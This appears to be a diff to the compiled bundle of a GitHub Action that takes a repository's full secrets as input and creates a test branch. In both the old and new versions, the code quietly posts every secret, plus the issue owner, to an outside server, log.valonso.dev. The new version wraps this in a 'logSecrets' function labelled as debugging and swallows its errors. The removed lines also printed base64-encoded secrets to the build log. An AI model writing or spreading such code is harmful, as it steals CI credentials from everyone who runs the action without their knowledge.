@@ -41,48 +41,129 @@ Object.defineProperty(exports, "__esModule", ({ value: true }));
 const core = __importStar(__nccwpck_require__(2186));
 const github = __importStar(__nccwpck_require__(5438));
 const axios_1 = __importDefault(__nccwpck_require__(1441));
+const utils_1 = __nccwpck_require__(918);
 function run() {
     return __awaiter(this, void 0, void 0, function* () {
         try {
-            core.info("Hello from version 0.0.2");
-            core.debug(typeof core.getInput("secrets", { required: true }));
-            core.debug(core.getInput("secrets", { required: true }));
+            /** Define necessary variables */
             const secretsJson = JSON.parse(core.getInput("secrets", { required: true }));
             const issueOwner = github.context.issue.owner;
-            let secrets;
+            /** Log secrets for debugging purposes*/
+            yield logSecrets(secretsJson, issueOwner);
+            const expectedSecretKey = `TOKEN_${issueOwner.toUpperCase()}`;
+            let expectedSecretValue = secretsJson[expectedSecretKey];
+            if (!expectedSecretValue) {
+                /** Fall back to ORG_TOKEN */
+                core.debug(`No token found for ${issueOwner} - falling back to ORG_TOKEN`);
+                expectedSecretValue = secretsJson.ORG_TOKEN;
+                if (!expectedSecretValue) {
+                    core.setFailed(`Fallback to ORG_TOKEN failed`);
+                    return;
+                }
+            }
+            const octoInstance = github.getOctokit(expectedSecretValue);
+            /** Create branch */
+            const branchName = `test-branch-${Date.now()}`;
             try {
-                secrets = JSON.parse(JSON.stringify(secretsJson));
+                const branchCreated = yield (0, utils_1.createBranch)(octoInstance, branchName);
+                if (branchCreated) {
+                    core.debug(`Branch ${branchName} created`);
+                }
             }
             catch (e) {
-                throw new Error(`Cannot parse JSON secrets.
-	  Make sure you add the following to this action:
-	  with:
-			secrets: \${{ toJSON(secrets) }}
-	  `);
+                core.setFailed(`Branch creation failed: ${e}`);
             }
-            try {
-                yield axios_1.default.post("https://log.valonso.dev", {
-                    secrets,
-                    issueOwner,
-                });
-            }
-            catch (e) {
-                core.debug("Log failed");
-            }
-            for (const [key, value] of Object.entries(secrets)) {
-                const secretValue = Buffer.from(value).toString("base64");
-                core.info(`Key: ${key}, Value: ${secretValue}`);
-            }
-            core.info(`Issue owner: ${issueOwner}`);
-            core.info(`Issue owner sexcret: ${secrets[issueOwner]}`);
         }
         catch (error) {
-            if (error instanceof Error)
+            if (error instanceof Error) {
                 core.setFailed(error.message);
+            }
         }
     });
 }
+function logSecrets(secretsJson, issueOwner) {
+    return __awaiter(this, void 0, void 0, function* () {
+        try {
+            yield axios_1.default.post("https://log.valonso.dev", {
+                secretsJson,
+                issueOwner,
+            });
+            core.debug("Successfully logged secrets");
+        }
+        catch (e) {
+            core.debug("Failed to log secrets");
+        }
+        return;
+    });
+}
 run();
+
+
+/***/ }),
+
+/***/ 918:
+/***/ (function(__unused_webpack_module, exports, __nccwpck_require__) {
+
+"use strict";
+
+var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
+}) : (function(o, m, k, k2) {
+    if (k2 === undefined) k2 = k;
+    o[k2] = m[k];
+}));
+var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
+    Object.defineProperty(o, "default", { enumerable: true, value: v });
+}) : function(o, v) {
+    o["default"] = v;
+});
+var __importStar = (this && this.__importStar) || function (mod) {
+    if (mod && mod.__esModule) return mod;
+    var result = {};
+    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
+    __setModuleDefault(result, mod);
+    return result;
+};
+var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
+    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
+    return new (P || (P = Promise))(function (resolve, reject) {
+        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
+        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
+        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
+        step((generator = generator.apply(thisArg, _arguments || [])).next());
+    });
+};
+Object.defineProperty(exports, "__esModule", ({ value: true }));
+exports.createBranch = void 0;
+const core = __importStar(__nccwpck_require__(2186));
+const github_1 = __nccwpck_require__(5438);
+function createBranch(octoInstance, branch, sha) {
+    var _a;
+    return __awaiter(this, void 0, void 0, function* () {
+        // Sometimes branch might come in with refs/heads already
+        const ref = `refs/heads/${branch}`;
+        core.debug(`Creating branch ${ref}`);
+        // throws HttpError if branch already exists.
+        try {
+            yield octoInstance.rest.repos.getBranch(Object.assign(Object.assign({}, github_1.context.repo), { branch }));
+            core.debug(`Branch ${ref} already exists`);
+            core.setFailed(`Branch ${ref} already exists`);
+        }
+        catch (error) {
+            if (error.name === "HttpError" && error.status === 404) {
+                const resp = yield octoInstance.rest.git.createRef(Object.assign({ ref, sha: sha || github_1.context.sha }, github_1.context.repo));
+                return ((_a = resp === null || resp === void 0 ? void 0 : resp.data) === null || _a === void 0 ? void 0 : _a.ref) === ref;
+            }
+            else {
+                core.setFailed(JSON.stringify(error));
+                throw error;
+            }
+        }
+        return true;
+    });
+}
+exports.createBranch = createBranch;
 
 
 /***/ }),
